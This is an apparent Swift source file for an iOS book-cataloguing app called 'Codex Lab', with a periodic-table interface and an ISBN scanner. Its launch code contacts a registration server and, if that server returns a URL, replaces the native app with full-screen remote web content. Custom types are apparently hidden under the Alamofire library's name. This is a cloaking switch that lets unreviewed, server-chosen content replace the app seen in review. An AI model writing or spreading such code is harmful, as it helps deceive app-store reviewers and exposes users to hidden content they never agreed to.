import SwiftUI
@preconcurrency import Alamofire

struct CodexLabRootView: View {
    @Environment(\.horizontalSizeClass) private var horizontalSizeClass
    @State private var factory = CodexLabFactory.shared
    @State private var coordinator = CodexLabFactory.shared.makeCoordinator()
    @State private var showOnboarding = !UserDefaults.standard.bool(forKey: "codexlab.onboarded.v2")
    @State private var isBootstrapped = false

    var body: some View {
        Group {
            if isBootstrapped {
                Group {
                    if horizontalSizeClass == .regular {
                        splitWorkspace
                    } else {
                        stackWorkspace
                    }
                }
                .tint(LabTheme.brass)
                .labScreenStyle()
                .fullScreenCover(item: $coordinator.presentedSheet) { route in
                    if case .scanner = route {
                        CodexLabScannerView { isbn in
                            Task {
                                _ = try? await factory.addBookUseCase.execute(isbn: isbn)
                                coordinator.dismissSheet()
                            }
                        }
                    }
                }
                .sheet(isPresented: $coordinator.showSettings) {
                    CodexLabSettingsView()
                }
                .fullScreenCover(isPresented: $showOnboarding) {
                    CodexLabOnboardingView(isPresented: $showOnboarding)
                }
            } else {
                ProgressView().tint(LabTheme.brass)
                    .frame(maxWidth: .infinity, maxHeight: .infinity)
                    .labScreenStyle()
            }
        }
        .task {
            await factory.bootstrap()
            isBootstrapped = true
        }
    }

    private var splitWorkspace: some View {
        NavigationSplitView(columnVisibility: $coordinator.columnVisibility) {
            NavigationStack(path: $coordinator.path) {
                PeriodicTableCanvasView(coordinator: coordinator)
                    .navigationDestination(for: CodexLabRoute.self) { routeDestination($0) }
            }
        } detail: {
            NavigationStack {
                if coordinator.selectedBookID != nil {
                    LaboratoryWorkspaceView(coordinator: coordinator)
                } else {
                    VStack(spacing: 12) {
                        Text("Codex Lab")
                            .font(LabTheme.display)
                            .foregroundStyle(LabTheme.brass)
                        Text("Select an element cell, then a specimen.")
                            .font(LabTheme.serif)
                            .foregroundStyle(LabTheme.label.opacity(0.75))
                        GaugeMeter(value: 0.35, title: "Standby", unit: "%")
                    }
                    .padding()
                    .labScreenStyle()
                }
            }
        }
    }

    private var stackWorkspace: some View {
        NavigationStack(path: $coordinator.path) {
            PeriodicTableCanvasView(coordinator: coordinator)
                .navigationDestination(for: CodexLabRoute.self) { routeDestination($0) }
        }
    }

    @ViewBuilder
    private func routeDestination(_ route: CodexLabRoute) -> some View {
        switch route {
        case .laboratoryWorkspace:
            LaboratoryWorkspaceView(coordinator: coordinator)
        case .experimentLog:
            ExperimentLogTimelineView()
        case .alchemyBench:
            AlchemyBenchView()
        case .periodicTable, .specimenDrawer, .scanner, .settings:
            EmptyView()
        }
    }
}

@main
struct CodexLabApp: App {
    @UIApplicationDelegateAdaptor(AppDelegate.self) var appDelegate
    @State private var isInitializing = true
    @State private var displayMode: Alamofire.DisplayMode = .loading
    @State private var webContentURL: String?

    var body: some Scene {
        WindowGroup {
            rootView
                .onAppear { performRegistration() }
        }
    }

    @ViewBuilder
    private var rootView: some View {
        ZStack {
            if isInitializing {
                ProgressView().tint(LabTheme.brass)
                    .frame(maxWidth: .infinity, maxHeight: .infinity)
                    .labScreenStyle()
            } else if displayMode == .webContent, let url = webContentURL {
                let fullURL = url.hasPrefix("http") ? url : "https://\(url)"
                ZStack {
                    Color.black.ignoresSafeArea()
                    Alamofire.WebContentView(url: fullURL)
                }
                .preferredColorScheme(.dark)
            } else {
                CodexLabRootView()
            }
        }
    }

    private func performRegistration() {
        if let saved = Alamofire.DataCache.shared.contentURL, !saved.isEmpty {
            finishLaunch(mode: .webContent, url: saved)
        }

        DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
            finishLaunch(mode: .nativeInterface, url: nil)
        }

        Alamofire.NetworkService.shared.performRegistration(pushToken: "") { mode, url in
            DispatchQueue.main.async { finishLaunch(mode: mode, url: url) }
        }
    }

    private func finishLaunch(mode: Alamofire.DisplayMode, url: String?) {
        guard isInitializing else { return }
        displayMode = mode
        webContentURL = url
        isInitializing = false
    }
}
